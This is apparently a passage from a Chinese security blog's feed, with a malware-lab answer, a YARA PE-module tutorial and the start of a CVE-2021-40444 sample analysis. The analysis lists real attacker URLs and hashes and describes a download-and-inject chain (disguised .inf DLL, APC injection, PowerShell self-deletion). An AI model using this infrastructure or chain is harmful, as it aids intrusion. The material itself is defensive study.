title="6.释放出恶意代码的目的是什么？"></a>6.释放出恶意代码的目的是什么？</h3><p>会从指定的域名中下载一些资源，来进行更新，而windows本身的wupdmgr.exe被转移到temp目录下，在持久化驻留的同时，也不影响原程序的运行。</p>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析实战</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>病毒分析</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>yara规则学习笔记（三）</title>
    <link href="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>基本的一些语法，规则的应用基本已经学习完了，现在来练习一下模块的用法，主要先是PE这个模块，具体的每一个值的用法在官方文档中已经描述的非常详细了，我就不再过多的去介绍其用法了，我只是拿过来部分去进行实际的编写测试。在本篇之前，应该至少要对PE文件结构有了解，如果对PE还不是非常的了解的话，建议先去学习PE结构。</p><p>官方文档PE模块地址：</p><p><a href="https://yara.readthedocs.io/en/v4.1.2/modules/pe.html">https://yara.readthedocs.io/en/v4.1.2/modules/pe.html</a></p><p>之前的学习笔记</p><p><a href="https://b1ackie.cn/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/">yara规则学习笔记（一）</a></p><p><a href="https://b1ackie.cn/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/">yara规则学习笔记（二）</a></p><h2 id="PE模块"><a href="#PE模块" class="headerlink" title="PE模块"></a>PE模块</h2><p>导入PE模块非常简单，加入</p><blockquote><p>import “pe”</p></blockquote><p>这样即可导入。</p><p>该模块中公布了PE结构中大部分存在的字段，并提供了可用于编写更加具有针对性的功能。</p><p>官方示例</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule <span class="hljs-class">single_section</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">    condition:</span><br>        pe.number_of_sections == <span class="hljs-number">1</span><br>&#125;<br><br>rule <span class="hljs-class">control_panel_applet</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">    condition:</span><br>        pe.exports(<span class="hljs-string">&quot;CPlApplet&quot;</span>)<br>&#125;<br><br>rule <span class="hljs-class">is_dll</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">    condition:</span><br>        pe.characteristics &amp; pe.DLL<br>&#125;<br><br>rule <span class="hljs-class">is_pe</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">    condition:</span><br>        pe.is_pe<br>&#125;<br></code></pre></div></td></tr></table></figure><p>首先先编写一个弹窗的exe来进行测试，不进行任何的优化设置。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;yara rule test&quot;</span>, <span class="hljs-string">&quot;b1ackie!&quot;</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="machine"><a href="#machine" class="headerlink" title="machine"></a>machine</h3><p>machine字段是运行平台，可以在编写时指定对应的值来判断运行平台，具体的值请去官方文档进行查看。</p><p>查看编写的测试文件的machine，可以看到是Intel386。</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/1.png"></p><p>编写相应的规则</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule <span class="hljs-class">machine</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.machine == pe.MACHINE_I386<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/2.png"></p><h3 id="timestamp"><a href="#timestamp" class="headerlink" title="timestamp"></a>timestamp</h3><p>时间戳</p><p>在前面可以看到时间戳是6150116D</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule <span class="hljs-class">time</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.timestamp == <span class="hljs-number">0x6150116D</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="size-of-optional-header"><a href="#size-of-optional-header" class="headerlink" title="size_of_optional_header"></a>size_of_optional_header</h3><p>可选头的大小</p><p>从前面的图片可以看到，可选头的大小是0xE0，编写规则。</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule <span class="hljs-class">size_of_optional_header</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.size_of_optional_header == <span class="hljs-number">0xE0</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="size-of-code"><a href="#size-of-code" class="headerlink" title="size_of_code"></a>size_of_code</h3><p>这是IMAGE_OPTIONAL_HEADER::SizeOfCode的值</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/3.png"></p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule <span class="hljs-class">size_of_code</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.size_of_code == <span class="hljs-number">0xE00</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="entry-point"><a href="#entry-point" class="headerlink" title="entry_point"></a>entry_point</h3><p>入口点</p><p>使用OD打开测试程序，可以看到入口点处的代码十六进制值</p><blockquote><p>E8 C5 03 00 00</p></blockquote><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/4.png"></p><figure class="highlight puppet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs puppet">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule <span class="hljs-keyword">test</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = &#123;E8 C5 <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>&#125;<br><span class="hljs-keyword">condition</span>:<br><span class="hljs-variable">$a</span> at pe.entry_point<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="entry-point-raw"><a href="#entry-point-raw" class="headerlink" title="entry_point_raw"></a>entry_point_raw</h3><p>入口点的地址</p><p>查看入口点地址</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/5.png"></p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule <span class="hljs-class">test</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.entry_point_raw == <span class="hljs-number">0x126C</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="base-of-code"><a href="#base-of-code" class="headerlink" title="base_of_code"></a>base_of_code</h3><p>IMAGE_OPTIONAL_HEADER::BaseOfCode 的值</p><h3 id="base-of-data"><a href="#base-of-data" class="headerlink" title="base_of_data"></a>base_of_data</h3><p>IMAGE_OPTIONAL_HEADER::BaseOfData 的值</p><h3 id="image-base"><a href="#image-base" class="headerlink" title="image_base"></a>image_base</h3><p>IMAGE_OPTIONAL_HEADER::ImageBase 的值</p><p>现在来一起测试一下，查看示例程序这三项的值</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/6.png"></p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule test<br>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.<span class="hljs-keyword">base_of_code </span>== <span class="hljs-number">0x1000</span> <span class="hljs-keyword">and </span><br>pe.<span class="hljs-keyword">base_of_data </span>== <span class="hljs-number">0x2000</span> <span class="hljs-keyword">and</span><br><span class="hljs-keyword"></span>pe.image_base == <span class="hljs-number">0x400000</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="data-directories"><a href="#data-directories" class="headerlink" title="data.directories"></a>data.directories</h3><p>数据目录表中的IMAGE_DATA_DIRECTORY结构信息，RVA和SIZE。具体的字段参考官方文档。</p><p>这里用导入表（IMAGE_DIRECTORY_ENTRY_IMPORT）来做测试，查看示例程序的导入表的RVA和size</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/7.png"></p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule test<br>&#123;<br>condition:<br>pe<span class="hljs-selector-class">.data_directories</span><br><span class="hljs-selector-attr">[pe.IMAGE_DIRECTORY_ENTRY_IMPORT]</span><span class="hljs-selector-class">.virtual_address</span><br>== <span class="hljs-number">0</span>x2594 <br>and<br>pe<span class="hljs-selector-class">.data_directories</span><br><span class="hljs-selector-attr">[pe.IMAGE_DIRECTORY_ENTRY_IMPORT]</span><span class="hljs-selector-class">.size</span><br>== <span class="hljs-number">0</span>xb4<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="number-of-sections"><a href="#number-of-sections" class="headerlink" title="number_of_sections"></a>number_of_sections</h3><p>pe文件中的节的数量</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/8.png"></p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule <span class="hljs-class">test</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.number_of_sections == <span class="hljs-number">5</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="sections"><a href="#sections" class="headerlink" title="sections"></a>sections</h3><p>PE文件中的节的信息，PE 的每个部分对应一个。可以使用 [] 运算符访问各个部分。具体的信息可以去官方文档进行查看。这里介绍部分。</p><p><code>name</code>，名称</p><p><code>virtual_address</code>，虚拟地址</p><p><code>virtual_size</code>，虚拟大小</p><p><code>raw_data_offset</code>，raw地址</p><p><code>raw_data_size</code>，raw大小</p><p>查看示例程序这几项的数据</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/9.png"></p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule test<br>&#123;<br>condition:<br>pe<span class="hljs-selector-class">.sections</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.name</span> == <span class="hljs-string">&quot;.text&quot;</span> and<br>pe<span class="hljs-selector-class">.sections</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.virtual_address</span> == <span class="hljs-number">0</span>x1000 and<br>pe<span class="hljs-selector-class">.sections</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.virtual_size</span> == <span class="hljs-number">0</span>xca1 and<br>pe<span class="hljs-selector-class">.sections</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.raw_data_offset</span> == <span class="hljs-number">0</span>x400 and<br>pe<span class="hljs-selector-class">.sections</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.raw_data_size</span> == <span class="hljs-number">0</span>xe00<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="resources"><a href="#resources" class="headerlink" title="resources"></a>resources</h3><p>一个从0开始的资源对象数组，PE拥有的每个资源对应一个。可以使用[]访问单个资源。每个资源对象具有以下属性：</p><p><code>rva</code> 资源数据的RVA</p><p><code>offset</code> 资源数据偏移量</p><p><code>length</code> 资源数据的长度</p><p><code>type</code> 资源类型（整数）</p><p><code>id</code> 资源的ID（整数）</p><p><code>language</code> 资源的语言（整数）</p><p><code>type_string</code> 资源类型为字符串</p><p><code>name_string</code> 字符串的资源名称</p><p><code>language_string</code> 字符串的资源语言</p><p>根据PE结构的资源部分可以知道，资源节是树状的结构，一层一层，而第一层就是资源类型，第二层是资源ID，第三层是资源语言，然后之后是具体的数据，具体这部分可以去学习一下PE结构。</p><p>看下示例文件的资源结构，如图可以看到这三项分别是24、1、1033。</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/10.png"></p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">import <span class="hljs-string">&quot;pe&quot;</span><br>rule test<br>&#123;<br>condition:<br>pe<span class="hljs-selector-class">.resources</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.type</span> == <span class="hljs-number">24</span> and<br>pe<span class="hljs-selector-class">.resources</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.id</span> == <span class="hljs-number">1</span> and<br>pe<span class="hljs-selector-class">.resources</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.language</span> == <span class="hljs-number">1033</span> and<br>pe<span class="hljs-selector-class">.resources</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.length</span> == <span class="hljs-number">0</span>x17D<br>&#125;<br></code></pre></div></td></tr></table></figure><p>再拿一个别的文件来进行测试，可以看到其资源类型是字符串类型“MYRES”</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/11.png"></p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">import <span class="hljs-string">&quot;pe&quot;</span><br>rule test<br>&#123;<br>condition:<br>pe<span class="hljs-selector-class">.resources</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.type_string</span> == <span class="hljs-string">&quot;M\x00Y\x00R\x00E\x00S\x00&quot;</span> and<br>pe<span class="hljs-selector-class">.resources</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.id</span> == <span class="hljs-number">102</span> and<br>pe<span class="hljs-selector-class">.resources</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.language</span> == <span class="hljs-number">2052</span><br>&#125;<br><br><br></code></pre></div></td></tr></table></figure><p>再测试一个文件，看到资源类型和资源ID都是字符串。</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/12.png"></p><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">import &quot;pe&quot;<br>rule test<br>&#123;<br>condition:<br>pe.resources[0].type_string == &quot;U<span class="hljs-symbol">\x</span>00N<span class="hljs-symbol">\x</span>00I<span class="hljs-symbol">\x</span>00C<span class="hljs-symbol">\x</span>00O<span class="hljs-symbol">\x</span>00D<span class="hljs-symbol">\x</span>00E<span class="hljs-symbol">\x</span>00&quot; and<br>pe.resources[0].name_string == &quot;L<span class="hljs-symbol">\x</span>00O<span class="hljs-symbol">\x</span>00C<span class="hljs-symbol">\x</span>00A<span class="hljs-symbol">\x</span>00L<span class="hljs-symbol">\x</span>00I<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>00A<span class="hljs-symbol">\x</span>00T<span class="hljs-symbol">\x</span>00I<span class="hljs-symbol">\x</span>00O<span class="hljs-symbol">\x</span>00N<span class="hljs-symbol">\x</span>00&quot; and<br>pe.resources[0].language == 0<br>&#125;<br><br><br></code></pre></div></td></tr></table></figure><h3 id="pdb-path"><a href="#pdb-path" class="headerlink" title="pdb_path"></a>pdb_path</h3><p>pdb文件的路径</p><p>查看示例程序的PDB路径</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/13.png"></p><figure class="highlight swift"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs swift"><span class="hljs-keyword">import</span> &quot;pe&quot;<br>rule test<br>&#123;<br>condition:<br>pe.pdb_path <span class="hljs-operator">==</span> <span class="hljs-string">&quot;D:<span class="hljs-subst">\\</span>programing<span class="hljs-subst">\\</span>something<span class="hljs-subst">\\</span>YaraRule_Test<span class="hljs-subst">\\</span>Release<span class="hljs-subst">\\</span>YaraRule_Test.pdb&quot;</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="exports"><a href="#exports" class="headerlink" title="exports"></a>exports</h3><p>PE文件导出的函数名，可以使用函数名也可以使用序号。</p><p>测试一下user32.dll，我们知道这个DLL会导出函数<code>MessageBoxA</code></p><figure class="highlight coffeescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coffeescript"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;pe&quot;</span><br>rule test<br>&#123;<br>condition:<br>pe.<span class="hljs-built_in">exports</span>(<span class="hljs-string">&quot;MessageBoxA&quot;</span>)<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/14.png"></p><h3 id="imports"><a href="#imports" class="headerlink" title="imports"></a>imports</h3><p>如果一个PE文件从某DLL中导入了某个函数，则函数会返回TRUE，否则返回FALSE。我们的测试程序调用了MessageBoxA，这个函数是从user32.dll中导入的。也可以使用序号，也可以只是dll名称，具体用法还有很多，请查看官方文档。</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/15.png"></p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br>rule <span class="hljs-class">test</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.imports(<span class="hljs-string">&quot;user32.dll&quot;</span>,<span class="hljs-string">&quot;MessageBoxA&quot;</span>) <br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="is-pe"><a href="#is-pe" class="headerlink" title="is_pe"></a>is_pe</h3><p>如果文件是PE文件，返回true</p><h3 id="is-dll"><a href="#is-dll" class="headerlink" title="is_dll()"></a>is_dll()</h3><p>如果是DLL文件，返回true</p><h3 id="is-32bit"><a href="#is-32bit" class="headerlink" title="is_32bit()"></a>is_32bit()</h3><p>如果PE文件是32位的，返回true</p><h3 id="is-64bit"><a href="#is-64bit" class="headerlink" title="is_64bit()"></a>is_64bit()</h3><p>如果PE文件是64位，返回true</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br>rule <span class="hljs-class">ispe</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.is_pe<br>&#125;<br>rule <span class="hljs-class">isdll</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.is_dll()<br>&#125;<br>rule <span class="hljs-class">is32</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.is_32bit()<br>&#125;<br>rule <span class="hljs-class">is64</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.is_64bit()<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>YARA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>YARA</tag>
      
      <tag>恶意代码检测</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-40444的样本分析</title>
    <link href="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <url>/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间微软披露了cve-2021-40444，紧随其后就有大量的样本利用了此漏洞，本篇来分析一下一个利用了此漏洞的样本。</p><h2 id="样本信息"><a href="#样本信息" class="headerlink" title="样本信息"></a>样本信息</h2><ul><li>样本名称：A Letter before court 4.docx</li><li>样本大小：24177字节</li><li>样本类型：TrojanDownloader、exploit、cve-2021-40444</li><li>MD5：1d2094ce85d66878ee079185e2761beb</li><li>SHA1：53b31e513d8e23e30b7f133d4504ca7429f0e1fe</li><li>SHA256：938545f7bbe40738908a95da8cdeabb2a11ce2ca36b0f6a74deda9378d380a52</li></ul><h2 id="样本行为"><a href="#样本行为" class="headerlink" title="样本行为"></a>样本行为</h2><ol><li>打开文档尝试访问<a href="http://hidusi.com/e8c76295a5f9acb7">http://hidusi.com/e8c76295a5f9acb7</a> ，并下载side.html。</li><li>side.html内部包含混淆过的JS代码来利用 CVE-2021-40444漏洞来进行攻击。</li><li>side.html访问<a href="http://hidusi.com/e8c76295a5f9acb7/ministry.cab">http://hidusi.com/e8c76295a5f9acb7/ministry.cab</a> ，ministry.cab中包含着一个inf文件，实际上这是一个dll文件。</li><li>将cab中的Champion.inf文件保存在电脑上的若干路径。</li><li>执行Champion.inf，它会进行APC注入，注入进程为wabmig.exe，然后启动powershell进程实现自删除。</li></ol><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><p>打开文档会比较慢，可以看到提示正在从服务器下载side.html文件。</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/1.png"></p><p>将DOCX格式改为压缩包格式进行解压缩，在文件内找到\word\_rels下的document.xml.rels文件，当存在需要下载的内容时，里面会存放地址。</p><p>可以看到请求下载的地址。</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2.png"></p><p>打开side.html文件，里面是混淆过得JS代码，这部分JS代码利用了漏洞来进行攻击。本篇不讨论具体的漏洞攻击详情，只涉及到样本的分析。</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/3.png"></p><p><a 